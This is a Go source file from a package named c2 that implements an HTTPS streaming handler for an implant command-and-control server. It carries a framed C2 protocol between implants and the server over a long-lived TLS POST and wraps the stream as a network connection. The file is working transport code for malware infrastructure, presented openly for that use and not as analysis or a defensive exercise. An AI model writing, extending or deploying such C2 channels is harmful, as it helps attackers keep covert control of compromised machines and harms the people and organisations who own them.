package c2

import (
	"io"
	"net"
	"net/http"
	"sync"
	"time"
)

// HTTPSStreamHandler carries the same framed C2 protocol over a long-lived
// HTTP POST. The request body is the implant-to-server stream; the response
// body is the server-to-implant stream. The listener must serve TLS (ideally
// with client-certificate verification) and the client must stream the body
// rather than buffering it.
func (s *ImplantServer) HTTPSStreamHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.TLS == nil {
			http.Error(w, "TLS required", http.StatusBadRequest)
			return
		}
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		flusher, ok := w.(http.Flusher)
		if !ok {
			http.Error(w, "streaming unsupported", http.StatusInternalServerError)
			return
		}

		remote, err := net.ResolveTCPAddr("tcp", r.RemoteAddr)
		if err != nil {
			remote = &net.TCPAddr{}
		}
		conn := &httpStreamConn{
			r:       r.Body,
			w:       w,
			flusher: flusher,
			remote:  remote,
			closed:  make(chan struct{}),
		}

		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Cache-Control", "no-store")
		w.WriteHeader(http.StatusOK)
		flusher.Flush()

		s.HandleCarrierConnection(conn, "https")
	}
}

type httpStreamConn struct {
	r       io.ReadCloser
	w       http.ResponseWriter
	flusher http.Flusher
	remote  net.Addr
	once    sync.Once
	closed  chan struct{}
}

func (c *httpStreamConn) Read(p []byte) (int, error) {
	return c.r.Read(p)
}

func (c *httpStreamConn) Write(p []byte) (int, error) {
	n, err := c.w.Write(p)
	if c.flusher != nil {
		c.flusher.Flush()
	}
	return n, err
}

func (c *httpStreamConn) Close() error {
	c.once.Do(func() { close(c.closed) })
	return c.r.Close()
}

func (c *httpStreamConn) LocalAddr() net.Addr              { return streamAddr("local") }
func (c *httpStreamConn) RemoteAddr() net.Addr             { return c.remote }
func (c *httpStreamConn) SetDeadline(time.Time) error      { return nil }
func (c *httpStreamConn) SetReadDeadline(time.Time) error  { return nil }
func (c *httpStreamConn) SetWriteDeadline(time.Time) error { return nil }

type streamAddr string

func (a streamAddr) Network() string { return "https" }
func (a streamAddr) String() string  { return string(a) }
